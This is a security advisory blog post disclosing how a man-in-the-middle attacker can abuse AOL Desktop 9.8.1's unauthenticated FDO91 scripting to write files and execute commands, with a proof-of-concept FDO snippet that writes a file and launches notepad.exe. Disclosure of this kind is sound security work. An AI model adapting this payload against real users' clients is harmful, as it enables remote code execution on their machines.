---
layout: post
title: "Security Advisory: AOL Desktop MiTM Remote File Write and Code Execution"
date: 2015-12-05
categories:
---

*By slipstream/RoL.*

# Overview

AOL Desktop is "the all-in-one experience with mail, instant messaging, browsing, search, content, and dial-up connectivity". It is the direct successor of the old Windows AOL clients from the 1990s.

Issues in AOL Desktop, version 9.8.1 and below, that have existed since 1993, can be exploited by an entity in a man-in-the-middle position to write files to disk and cause remote command execution.

# Issues

The custom AOL protocol involves a scripting language known as FDO91 (FDO). Packets sent between client and server, and server and client, include FDO91 that is compiled into a bytecode.

No authentication is done on any packets sent, and the client will execute any FDO it is sent by the server.

Some FDO opcodes are interesting from an attacker's perspective. The `fm_*` series of opcodes (the File Management protocol, `0x08xx`), have existed since the very first version of AOL for Windows from 1993. This series of opcodes enables reading from and writing to disk.

The `async_exec_app` opcode (`0x0d19`) takes a string operand, and executes the command in that string. This opcode has existed since version 2.0 of AOL for Windows, from 1994.

The snippet of FDO that follows attempts to write `pwned.txt` to disk and execute `notepad.exe` with the path to `pwned.txt` as an argument:

````
fm_start
fm_item_type <filename>
fm_item_set <"pwned.txt">
fm_item_type <path>
cm_tb_get_path
uni_use_last_atom_string <fm_item_set>
fm_item_get <filespec>
uni_use_last_atom_string <var_string_set, 01x>
fm_create_file
fm_open_file <01x>
fm_append_data <"AOL pwned clientside through MITM...\r\nReading/writing to FS and arbitrary command execution 1993-2015 :)">
fm_flush_file
fm_close_file
fm_end
var_string_set <A,"notepad.exe \"">
var_string_concatenate_regs <A,B>
var_string_set <B,"\"">
var_string_concatenate_regs <A,B>
var_string_get <A>
uni_use_last_atom_string <async_exec_app>
````

[A proof of concept is available](https://gist.github.com/Wack0/c1929ab5d29c83473bd4) that creates a MITM proxy that modifies a specific packet to add the bytecode of the above FDO to the end of that packet's original FDO and update the length.

# Affected Versions

9.8.1 and below. It is not known whether the betas of 9.8.2 are affected.

# Solution

Uninstallation of this software will prevent exploitation of these issues. The researchers cannot sanction any mitigations except to remove this software definitively from any affected devices.
